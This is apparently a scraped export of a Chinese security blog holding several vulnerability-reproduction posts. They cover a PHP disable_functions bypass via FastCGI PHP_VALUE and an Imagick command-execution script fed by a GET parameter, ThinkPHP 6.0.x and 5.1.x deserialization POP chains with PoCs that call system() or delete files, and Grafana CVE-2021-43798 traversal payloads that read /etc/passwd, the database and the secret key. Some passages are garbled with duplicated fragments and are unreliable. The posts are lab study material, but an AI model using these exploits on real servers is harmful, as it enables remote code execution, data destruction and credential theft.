即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。那要如何绕过这种限制呢？我们可以从php.ini入手。它有两个特殊选项，能够让我们去做到任意命令执行，那就是auto_prepend_file和auto_append_file。auto_prepend_file的功能是在执行目标文件之前，先包含它指定的文件。那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何PHP文件前都要包含一遍POST过去的内容。所以，我们只需要把待执行的代码放在POST Body中进行远程文件包含，这样就能做到任意代码执行了。 第三个限制 我们虽然可以通过远程文件包含执行任意代码，但是远程文件包含是有allow_url_include这个限制因素的，如果没有为ON的话就没有办法进行远程文件包含，那要怎么设置呢? 这里，PHP-FPM有两个可以设置PHP配置项的KEY-VALUE，即PHP_VALUE和PHP_ADMIN_VALUE，PHP_VALUE可以用来设置php.ini，PHP_ADMIN_VALUE则可以设置所有选项（disable_functions 选项除外），这样就解决问题了。 { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/name.php', 'SCRIPT_NAME': '/name.php', 'QUERY_STRING': '?name=alex', 'REQUEST_URI': '/name.php?name=alex', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '6666', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': &quot;localhost&quot;, 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' } 简单来说就是跳过中间件分配请求的过程，直接构造特定的数据包与php-fpm模块通信 通用 ImageMagick拓展 没复现成功 条件 imagic（&lt;= 3.3.0） 又因为imagic与php版本对应，所以 version&lt;=php5.6 windows下载 https://windows.php.net/downloads/pecl/releases/imagick/ 要点: 注意对应php版本 ts还是nts x86还是x64 这里以phpinfo()为准 添加拓展 解压上述文件后，将php_imagick.dll复制到php/ext目录 修改php.ini 加上extension=php_imagick.dll 编辑php.ini文件，使其加载 extension=imagick.so ​ 3.将其他dll放到php根目录 安装ImageMagick 在根据phpinfo中的信息去下 ImageMagick 6.9.1-2 Q16 x64 完全找不到- -，下载完成后重启计算机 利用脚本 &lt;?php echo &quot;Disable Functions: &quot; . ini_get('disable_functions') . &quot;\\n&quot;; $command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd']; if ($command == '') { $command = 'whoami'; } $exploit = &lt;&lt;&lt;EOF push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg&quot;|$command&quot;)' pop graphic-context EOF; file_put_contents(&quot;KKKK.mvg&quot;, $exploit); $thumb = new Imagick(); $thumb-&gt;readImage('KKKK.mvg'); $thumb-&gt;writeImage('KKKK.png'); $thumb-&gt;clear(); $thumb-&gt;destroy(); unlink(&quot;KKKK.mvg&quot;); unlink(&quot;KKKK.png&quot;); ?&gt; 找不到对应旧版本的ImageMagick，没复现成功 总结 简单做了下分类，说下结论 Windows下 bypass手段有限，只能期望com拓展以及imagic拓展开启 且imagic拓展版本要求严格 Linux下php高版本（7+）直接用内存漏洞通杀即可，所以其他高版本bypass手法我没有细看 低版本的话也不怕手段非常多 首先检查拓展如：pcntl,imap 或者模块apache2handler和fpm 再不行的话利用环境变量，最后再尝试Bash破壳 ","link":"https://liangyueliangyue.github.io/post/php-disable_function-rao-guo/"},{"title":"ThinkPHP v6.0.x反序列化漏洞复现与分析","content":"thinkPHP v6.0.0-6.0.3反序列化漏洞复现与分析 环境搭建 初始环境，需要注意的是，新版v6基于PHP7.1+开发 php-7.2.9 ThinkPHP v6.0.3 使用composer进行安装 composer create-project topthink/think=6.0.3 tp6.0 ⚠️坑点，截止到2021/09/16 ，默认核心安装的为framework=v6.0.9 think-orm=2.0.44 但是到最后面部分代码段已经修复了利用点，所以为了避免大家再次踩坑，请部署完成后，请前往composer.json 中，修改核心依赖相关版本，回退更新 &quot;require&quot;: { &quot;php&quot;: &quot;&gt;=7.1.0&quot;, &quot;topthink/framework&quot;: &quot;6.0.3&quot;, &quot;topthink/think-orm&quot;: &quot;2.0.30&quot; }, 进行回退更新，没有出现报错即成功 composer update 开启web服务进行验证访问' http://localhost/tp6.0/public/ 注意：实际测试需要PHP版本&gt;7.2.5 ****tp6.0 版本安装后默认使用单应用模式部署，url访问受到路由模式的影响，为了使用方便，我们先要去/config/app.php 中将with_route =&gt; false 访问控制器中的hello方法名，并且传递参数值 http://localhost/tp6.0/public/index.php/index/hello/name/123 构建反序列化入口 需要编写一个控制器模块并存在反序列化可控点，这样才能进行利用 tp6.0\\app\\controller\\Index.php public function lyy9(){ $tmp = $_POST['lyy9']; echo $tmp; unserialize($tmp); } 访问thinkphp路由 http://localhost/tp6.0/public/index.php/index/lyy9 漏洞分析 __destruct()链条 漏洞的一般起点在__destruct() 函数，这次位于/vendor/topthink/think-orm/src/Model.php this→lazySave可控，跟进save()方法 因为之前的__toString()链条仍然可以使用，因此要想办法找一个可以进入到__toString()的点，这里我们关注的是updateData() 所以前面的判断需要让他不成立，因为是||所以两个都不能为真 跟进isEmpty() 发现$this→data可控，让data[]不为空，则返回false ，第一个条件满足了，再跟进trigger() 可以发现这里$this→withEvent可控，设置withEvent为false 这样就会返回true，这样回到上一层if(false || false === true) 不成立，就会跳过判断 进入$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); exists 可控，我们跟进updateData() protected function updateData(): bool { // 事件回调 if (false === $this-&gt;trigger('BeforeUpdate')) { return false; } $this-&gt;checkData(); // 获取有更新的数据 $data = $this-&gt;getChangedData(); if (empty($data)) { // 关联更新 if (!empty($this-&gt;relationWrite)) { $this-&gt;autoRelationUpdate(); } return true; } if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) { // 自动写入更新时间 $data[$this-&gt;updateTime] = $this-&gt;autoWriteTimestamp($this-&gt;updateTime); $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime]; } // 检查允许字段 $allowFields = $this-&gt;checkAllowFields(); foreach ($this-&gt;relationWrite as $name =&gt; $val) { if (!is_array($val)) { continue; } foreach ($val as $key) { if (isset($data[$key])) { unset($data[$key]); } } } // 模型更新 $db = $this-&gt;db(); $db-&gt;startTrans(); try { $this-&gt;key = null; $where = $this-&gt;getWhere(); $result = $db-&gt;where($where) -&gt;strict(false) -&gt;cache(true) -&gt;setOption('key', $this-&gt;key) -&gt;field($allowFields) -&gt;update($data); $this-&gt;checkResult($result); // 关联更新 if (!empty($this-&gt;relationWrite)) { $this-&gt;autoRelationUpdate(); } $db-&gt;commit(); // 更新回调 $this-&gt;trigger('AfterUpdate'); return true; } catch (\\Exception $e) { $db-&gt;rollback(); throw $e; } } 这里前面trigger 可控，所以会直接跳过，checkData()并没有定义，也可以直接略过，跟进getChangedData() this→force可控，当为true 时，返回$this→data ，则$data=$this→data 继续向下跟进 可以看到，要进入checkAllowFields()，需要进行判断$data是否为空，这里要将$data 置为非空，这样就可以跳过判断，跟进checkAllowFields() $field和$schema 都可控，当构造为空时，就可以进入db() 方法 可以看到，这里有. 号，当我们进行构造对象进行字符串拼接时，就会触发__toString() 魔术方法 上半段pop链条 __destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString() 参数构造 $this-&gt;exists = true; $this-&gt;$lazySave = true; $this-&gt;$withEvent = false; __toString()链条 后面就是延续tp5反序列化的触发toString魔术方法了，就是原来vendor/topthink/think-orm/src/model/concern/Conversion.php的__toString开始的利用链 跟进toJson() 继续跟进toArray() public function toArray(): array { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { [$relation, $name] = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { [$relation, $name] = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) { $item[$key] = $val-&gt;toArray(); } } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } // 追加属性（必须定义获取器） foreach ($this-&gt;append as $key =&gt; $name) { $this-&gt;appendAttrToArray($item, $key, $name); } return $item; } 第三个foreach里面存在getAttr方法，他是个关键方法，我们需要触发他 触发条件：this−&gt;visible[this-&gt;visible[this−&gt;visible[key]存在，即this−&gt;visible存在键名为this-&gt;visible存在键名为this−&gt;visible存在键名为key的键，而key则来源于key则来源于key则来源于data的键名，data则来源于data则来源于data则来源于this-&gt;data，也就是说this−&gt;data和this-&gt;data和this−&gt;data和this-&gt;visible要有相同的键名$key 然后跟进到getAttr $key值就传入到了getData()方法，跟进getData方法 第一个if判断传入的值,key值不为空，因此绕过，然后key值不为空，因此绕过，然后key值不为空，因此绕过，然后key值传入到了getRealFieldName()方法，跟进getRealFieldName方法 当$this-&gt;strict为true时直接返回$name，即$key 回到getData方法，此时$fieldName = $key，进入判断语句： if (array_key_exists($fieldName, $this-&gt;data)) { return $this-&gt;data[$fieldName]; } elseif (array_key_exists($fieldName, $this-&gt;relation)) { return $this-&gt;relation[$fieldName]; } 返回$this-&gt;data[$fielName]也就是$this-&gt;data[$key]，记为$value 再回到getAttr，也就是返回 this−&gt;getValue(this-&gt;getValue(this−&gt;getValue(key, $value, null); 再跟进到getValue 首先$fieldName=$key 然后进行判断$this→withAttr[$fieldName] 是否存在进入二层判断，默认$relation=false ，不符合，进入下一个判断，默认json为空，主要在后一半$this→withAttr[$fieldName] 是否为数组，最终利用点在于后面的动态函数调用，所以前面两个判断都要绕过。正好withAttr[]我们是可以控制的，只要我们能让$key对应的不为数组就可以绕过 $closure = $this-&gt;withAttr[$fieldName]; $value = $closure($value, $this-&gt;data); 前面图中已经很明显写出来$fieldName=$key $value=$this→data[$key] 这样的话，就会把$this-&gt;withAttr[$key]（withAttr数组$key键对应的值）当做函数名动态执行，参数为$value=$this-&gt;data[$key]。 例如这样进行构造 $this-&gt;withAttr = [&quot;key&quot; =&gt; &quot;system&quot;]; $this-&gt;data = [&quot;key&quot; =&gt; &quot;whoami&quot;]; 最后实际执行的是system(&quot;whoami&quot;) 到这里呈现了一条完整的POP链。 __toString()--&gt;toJson()--&gt;toArray()--&gt;getAttr()-&gt;getData()-&gt;getRealFieldName()--&gt;getValue() POC构造 &lt;?php namespace think\\model\\concern; trait Attribute { private $data = [&quot;key&quot;=&gt;&quot;whoami&quot;]; private $withAttr = [&quot;key&quot;=&gt;&quot;system&quot;]; } namespace think; abstract class Model { use model\\concern\\Attribute; private $lazySave = true; protected $withEvent = false; private $exists = true; private $force = true; protected $name; public function __construct($obj=&quot;&quot;){ $this-&gt;name=$obj; } } namespace think\\model; use think\\Model; class Pivot extends Model {} $a=new Pivot(); $b=new Pivot($a); echo urlencode(serialize($b)); 访问 http://localhost/tp6.0/public/index.php/index/lyy9 总结 这次反序列化链的终点并不是call_user_func也不是回调函数，而是动态函数的调用 中间__toString()魔术方法的触发也不是通过函数调用而是对变量（类变量）的拼接 ","link":"https://liangyueliangyue.github.io/post/thinkphp-v60x-fan-xu-lie-hua-lou-dong-fu-xian-yu-fen-xi/"},{"title":"Grafana 任意文件读取漏洞复现分析","content":"Grafana 任意文件读取漏洞复现分析 CVE-2021-43798 0x01 前言 概述 Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。 影响范围 Grafana 8.0.0-beta1 - 8.3.0 安全版本 Grafana &gt;= 8.3.1 Grafana &gt;= 8.2.7 Grafana &gt;= 8.1.8 Grafana &gt;= 8.0.7 0x02 环境搭建 docker直接拉取官方镜像https://hub.docker.com/r/grafana/grafana/tags sudo docker pull grafana/grafana:8.3.0-ubuntu 开启容器 sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana:8.3.0-ubuntu 访问虚拟机 http://192.168.159.132:3000/ 0x03漏洞分析 github上8.3.1修复了这个漏洞，那么直接查看两者比较即可 可以看到是更改了 pkg/api/plugins.go 文件 下载8.3.0源码，定位到284行也就是getPluginAssets函数 func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) { pluginID := web.Params(c.Req)[&quot;:pluginId&quot;] plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID) if !exists { c.JsonApiErr(404, &quot;Plugin not found&quot;, nil) return } requestedFile := filepath.Clean(web.Params(c.Req)[&quot;*&quot;]) pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile) if !plugin.IncludedInSignature(requestedFile) { hs.log.Warn(&quot;Access to requested plugin file will be forbidden in upcoming Grafana versions as the file &quot;+ &quot;is not included in the plugin signature&quot;, &quot;file&quot;, requestedFile) } // It's safe to ignore gosec warning G304 since we already clean the requested file path and subsequently // use this with a prefix of the plugin's directory, which is set during plugin loading // nolint:gosec f, err := os.Open(pluginFilePath) if err != nil { if os.IsNotExist(err) { c.JsonApiErr(404, &quot;Plugin file not found&quot;, err) return } c.JsonApiErr(500, &quot;Could not open plugin file&quot;, err) return } defer func() { if err := f.Close(); err != nil { hs.log.Error(&quot;Failed to close file&quot;, &quot;err&quot;, err) } }() fi, err := f.Stat() if err != nil { c.JsonApiErr(500, &quot;Plugin file exists but could not open&quot;, err) return } if hs.Cfg.Env == setting.Dev { c.Resp.Header().Set(&quot;Cache-Control&quot;, &quot;max-age=0, must-revalidate, no-cache&quot;) } else { c.Resp.Header().Set(&quot;Cache-Control&quot;, &quot;public, max-age=3600&quot;) } http.ServeContent(c.Resp, c.Req, pluginFilePath, fi.ModTime(), f) } 刚开始拿到请求中的插件信息进行判断，插件是否存在，不存在就报错 Plugin not found 存在的话就接下去执行到关键点 requestedFile := filepath.Clean(web.Params(c.Req)[&quot;*&quot;]) 使用 filepath.Clean对请求进行清理，而Clean作用是这样的 此函数迭代地应用以下规则，直到无法进行进一步处理为止： 它用一个替换多个Separator元素。 如果指定的路径为空字符串，则返回字符串“.”。 它消除了每个。路径名元素(当前目录)。 它消除了每个内部..路径名元素(父目录)以及在其前面的non ..元素。 它消除了..元素开始于根路径：即，在分隔符为“ /”的情况下，在路径的开头用“/”替换“/..”。 **返回值：**通过纯词法处理，它返回与指定路径等效的最短路径名。 范例1： package main import ( &quot;fmt&quot; &quot;path/filepath&quot; ) // Calling main func main() { // Calling the Clean() function fmt.Println(filepath.Clean(&quot;/GFG/./../Geeks&quot;)) fmt.Println(filepath.Clean(&quot;GFG/../Geeks&quot;)) fmt.Println(filepath.Clean(&quot;..GFG/./../Geeks&quot;)) fmt.Println(filepath.Clean(&quot;gfg/../../../Geek/GFG&quot;)) } 输出： /Geeks Geeks Geeks ../../Geek/GFG 可以看出他对../是没有进行过滤处理的，也就导致了任意目录穿越 当我们传入类似于../../../etc/pass的路径时，就会被拼接到pluginFilePath参数中 然后在下面通过Open去成功读取文件内容 路径溯源 r.Get(&quot;/public/plugins/:pluginId/*&quot;, hs.getPluginAssets) 直接在api.go中使用了r.Get()并没有做身份认证（贴心的备注了身份认证的注释，不在当中）。 所以只要知道一个存在的pluginId，然后调用/public/plugins/:pluginId/*就可以访问任意文件，比如/public/plugins/:pluginId/../../../../../etc/passwd。 0x04补丁分析 在8.3.0和8.3.1对比中可以看到新加了一段代码 requestedFile := filepath.Clean(filepath.Join(&quot;/&quot;, web.Params(c.Req)[&quot;*&quot;])) rel, err := filepath.Rel(&quot;/&quot;, requestedFile) if err != nil { // this should not never fail c.JsonApiErr(500, &quot;Relative path found&quot;, err) return } 主要在 filepath.Rel函数 用法: func Rel(basepath, targpath string) (string, error) 当使用中间分隔符将其连接到basepath时，Rel返回一个相对路径，该相对路径在词法上等效于targpath。 也就是说，Join(basepath，Rel(basepath，targpath))等同于targpath本身。 成功后，即使basepath和targpath不共享任何元素，返回的路径也始终相对于basepath。 如果无法相对于基本路径创建targpath，或者如果需要知道当前工作目录以进行计算，则会返回错误。 Rel在结果上调用Clean。 示例 package main import ( &quot;fmt&quot; &quot;path/filepath&quot; ) func main() { paths := []string{ &quot;./a/b/c&quot;, &quot;/b/c&quot;, &quot;/../b/c&quot;, } base := &quot;/&quot; fmt.Println(&quot;On Unix:&quot;) for _, p := range paths { rel, err := filepath.Rel(base, p) fmt.Printf(&quot;%q: %q %v\\n&quot;, p, rel, err) } } 输出 On Unix: &quot;./a/b/c&quot;: &quot;&quot; Rel: can't make ./a/b/c relative to / &quot;/b/c&quot;: &quot;b/c&quot; &lt;nil&gt; &quot;/../b/c&quot;: &quot;b/c&quot; &lt;nil&gt; 这样我们就无法实现路径穿越了 0x05漏洞利用 要利用此漏洞，就要先找到安装的插件,常用的插件列表，经过测试全部是默认开启的（可能docker环境不同） alertmanager grafana loki postgres grafana-azure-monitor-datasource mixed prometheus cloudwatch graphite mssql tempo dashboard influxdb mysql testdata elasticsearch jaeger opentsdb zipkin alertGroups bargauge debug graph live piechart status-history timeseries alertlist candlestick gauge heatmap logs pluginlist table welcome annolist canvas geomap histogram news stat table-old xychart barchart dashlist gettingstarted icon nodeGraph state-timeline text 读取linux固定文件 /public/plugins/alertmanager/../../../../../../../../etc/passwd 读取grafana数据库文件 /public/plugins/alertmanager/../../../../../../../../var/lib/grafana/grafana.db 但是password是带salt的，所以不好破解 但是能获取到一些敏感信息，如user_auth_token表中的访问ip data_source表中的数据库信息 其中密码也是加密存储的 {&quot;password&quot;:&quot;M3NybDZNRG3C74ufA1oFVaLzieBN7pJAPJpuC0P2&quot;} 而加密方法是cfb模式下的AES256，秘钥存储在配置文件中 读取配置文件 /public/plugins/alertmanager/../../../../../../../../etc/grafana/grafana.ini 搜索secret_key SW2YcwTIb9zpOOhoPsMm 这里就不去手动解密了 直接使用师傅已经写好的工具，原理也是自动探测是否有漏洞、存在的plugin、提取密钥、解密server端db文件，并输出data_sourrce信息。 https://github.com/A-D-Team/grafanaExp 可以得到自己刚刚创建的数据源的所有信息 ","link":"https://liangyueliangyue.github.io/post/grafana-ren-yi-wen-jian-du-qu-lou-dong-fu-xian-fen-xi/"},{"title":"thinkphp5.1.x反序列化漏洞复现与分析","content":"thinkphp5.1.x反序列化漏洞复现与分析 环境搭建 安装compoer https://install.phpcomposer.com/composer.phar 放在php目录下，在 PHP 安装目录下新建一个 composer.bat 文件，并将下列代码保存到此文件中 @php &quot;%~dp0composer.phar&quot; %* 进入web根目录进行安装 composer create-project topthink/think=5.1.35 tp5.1 访问 http://localhost/tp5.1/public/ 构建反序列化入口 需要编写一个控制器模块并存在反序列化可控点，这样才能进行利用 tp5.1\\application\\index\\controller\\Index.php public function unser(){ $tmp = $_POST['test']; echo $tmp; unserialize(($tmp)); } 访问thinkphp路由 http://localhost/tp5.1/public/index.php/index/index/unser 漏洞分析 漏洞的起点在 /thinkphp/library/think/process/pipes/Windows.php的 __destruct() __destruct析构函数一般用于在对象销毁前的清理任务 根据路径名和函数名也能看出这是windows下的文件相关引起的漏洞 close()无法利用，跟进下 removeFiles()函数 这里遍历了 files，判断文件是否存在，如果存在就进行删除文件参数，并且这里 files可控，所以存在一个任意文件删除漏洞 简单编写poc，更加清晰的展示出来。 &lt;?php namespace think\\process\\pipes; class Windows { private $files = []; #构造函数更改$files public function __construct() { $this-&gt;files = [&quot;C:\\\\Users\\\\jin\\\\Desktop\\\\1.txt&quot;]; } } echo urlencode(serialize(new Windows())); #这里可以看出namespace也需要带入 访问得到结果 O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A26%3A%22C%3A%5CUsers%5Cjin%5CDesktop%5C1.txt%22%3B%7D%7D 利用我们刚刚在index控制器中创建的反序列化点，传入我们的payload，会发现创建的 1.txt文件已经被删除了。 任意文件删除是一个小漏洞，命令执行才是我们关注的点 在 removeFiles()函数中 file_exists会进行传入参数当作字符串进行处理 但是这里如果我们传入的参数是一个对象，那么就会调用对象的 __toString魔术方法，且files值我们可控 但是在 Windows类中并没有 __toString魔术方法 全局搜索下，这里我们选择了 thinkphp/library/think/model/concern/Conversion.php中的 __toString魔术方法 跟进下 toJson方法 继续跟进toArray方法 public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) { $item[$key] = $val-&gt;toArray(); } } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } // 追加属性（必须定义获取器） if (!empty($this-&gt;append)) { foreach ($this-&gt;append as $key =&gt; $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible($name); } } $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : []; } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible([$attr]); } } $item[$key] = $relation ? $relation-&gt;append([$attr])-&gt;toArray() : []; } else { $item[$name] = $this-&gt;getAttr($name, $item); } } } return $item; } 最关键的地方就是看到了$relation-&gt;visible($name);如果是可控变量-&gt;方法名(可控变量)，这里的方法名无所谓因为可以用__call去执行，所以就可以想办法去寻找存在的可利用的方法或者__call。 这里 $this-&gt;append可控，同时 $relation会被 getRelation($key)所控制，$relation-&gt;visible($name)是可能会被我们所控制的 验证这个猜想，我们继续跟进下 getRelation函数 第一层 $relation要为null，代码才会继续往下执行，所以 getRelation需要直接返回null if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible([$attr]); } } 然后继续跟进 getAttr方法 继续跟进 getData方法 到这里可以总结一下 $this-&gt;append 可控 $this-&gt;data 可控 key是key是key是this-&gt;append的键名 relation=relation=relation=this-&gt;getAttr(key)=key)=key)=this-&gt;data(name)=name)=name)=this-&gt;data[$key] relation=relation=relation=this-&gt;data[$key] 回到 toArray方法，整个流程就是这样的 当我们 $relation为一个对象时，就可以进行调用类中的 visible方法且传参可控，但是需要注意 _toString() trait Conversion类 toArray() trait Conversion类 getRelation() trait Attribute类 getAttr() trait Attribute类 自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。 为了让前面 __toString魔术方法的对象能够同时继承Attribute类和Conversion类。我们需要寻找一个子类，经过寻找，我们找到了 Model类，但是是个抽象类，抽象类不能直接实例化。 全局搜索后，选择了 Pivot继承了 Model类 全局搜索 visible方法后，发现都无法利用 现在还缺少一个代码执行可导致RCE的点，需要满足一下条件 1.该类中没有visible方法 2.类中实现了__call方法 我们可以考虑 __call()魔术方法，而且 __call一般会存在 __call_user_func和 __call_user_func_array，php代码执行的终点经常选择这里。 但是 public function __call($method, $args) 我们只能控制 $args,所以很多类都不可以用 __call()：在对象中调用一个不可访问方法时调用 经过寻找，Request类的 __call()方法可以使用 但是这里并不能直接利用达到命令执行，这里 $method**是visible，args是之前的∗∗‘args是之前的**`args是之前的∗∗‘name **可控，但是有这行代码：**array_unshift($args, this);‘∗∗会将∗∗‘this);`**会将**`this);‘∗∗会将∗∗‘this**插到**args‘∗∗前面，使得构造的∗∗‘args `**前面，使得构造的**`args‘∗∗前面，使得构造的∗∗‘method**执行的参数不可控，**this−&gt;hook[this-&gt;hook[this−&gt;hook[method]**是我们能控制的，我们可以构造一个hook数组**hook=[&quot;visible&quot;=&gt;&quot;任意方法&quot;]‘∗∗，想办法控制∗∗‘hook=[&quot;visible&quot;=&gt;&quot;任意方法&quot;]`**，想办法控制**`hook=[&quot;visible&quot;=&gt;&quot;任意方法&quot;]‘∗∗，想办法控制∗∗‘args就可以控制call_user_func_array` call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数]) //也就是这样，是很难进行命令执行的 $obj-&gt;$func($this,$argv) Thinkphp作为一个web框架，Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)所以可以尝试覆盖filter的方法去执行代码 我们找到Request类中的 filterValue函数，但是 value是形参不可控，如果我们直接在__call方法中直接调用 filterValue()，那么现在 $value的值始终是 [$this,xxx,xxx]形式的，导致我们无法实现RCE 该方法调用了call_user_func函数，但$value参数不可控，如果能找到一个$value可控的点就好了。 发现input()满足条件，这里用了一个回调函数调用了filterValue，但参数不可控不能直接用 再找找哪个方法调用了input且参数可控，找到param方法 param这里 this-&gt;param完全可控，是通过get传参数进去的，那么也就是说input函数中的 data参数可控，也就是 call_user_func的 $value，现在差一个条件，那就是 name可控，继续回溯 在isAjax函数中，我们可以控制$this-&gt;config['var_ajax']，$this-&gt;config['var_ajax']可控就意味着param函数中的$name可控。param函数中的$name可控就意味着input函数中的$name可控。 找到了链的起始位置为isAjax()，而执行代码的位置为input()函数中的filterValue()函数，我们把整个控制流程与代码汇总一下 首先在isAjax函数中，我们可以控制 this-&gt;config['var_ajax']意味着param函数中的 $name可控。 进入 param方法 public function param($name = '', $default = null, $filter = '') { if (!$this-&gt;mergeParam) { $method = $this-&gt;method(true); // 自动获取请求变量 switch ($method) { case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; } // 当前请求参数和URL地址中的参数合并 $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; } if (true === $name) { // 获取包含文件上传信息的数组 $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); } #调用input方法，$this-&gt;param为get与post所有参数，$name为isAjax传入,$default=null,$filter='' return $this-&gt;input($this-&gt;param, $name, $default, $filter); } 再回到input函数中 public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if ('' != $name) { // 解析name if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this-&gt;getData($data, $name); #$data为get与post所有参数,$name的值来自于`$this-&gt;config['var_ajax']` if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) { // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针 $this-&gt;arrayReset($data); } } else { $this-&gt;filterValue($data, $name, $filter); } if (isset($type) &amp;&amp; $data !== $default) { // 强制类型转换 $this-&gt;typeCast($data, $type); } return $data; } 跟进到getData函数 protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; #$data为get与post所有参数,$name的值来自于$this-&gt;config['var_ajax'] #所以$data最后为get与post所有参数[$this-&gt;config['var_ajax']] } else { return; } } return $data; } 在跟进到getFilter函数 protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } 这里的$filter来自于this-&gt;filter，我们需要定义this-&gt;filter为函数名 然后执行回调函数 array_walk_recursive($data, [$this, 'filterValue'], $filter); array 输入的数组。 callback 典型情况下 callback 接受两个参数。array 参数的值作为第一个，键名作为第二个。 注意: 如果 callback 需要直接作用于数组中的值，则给 callback 的第一个参数指定为引用。这样任何对这些单元的改变也将会改变原始数组本身。 arg 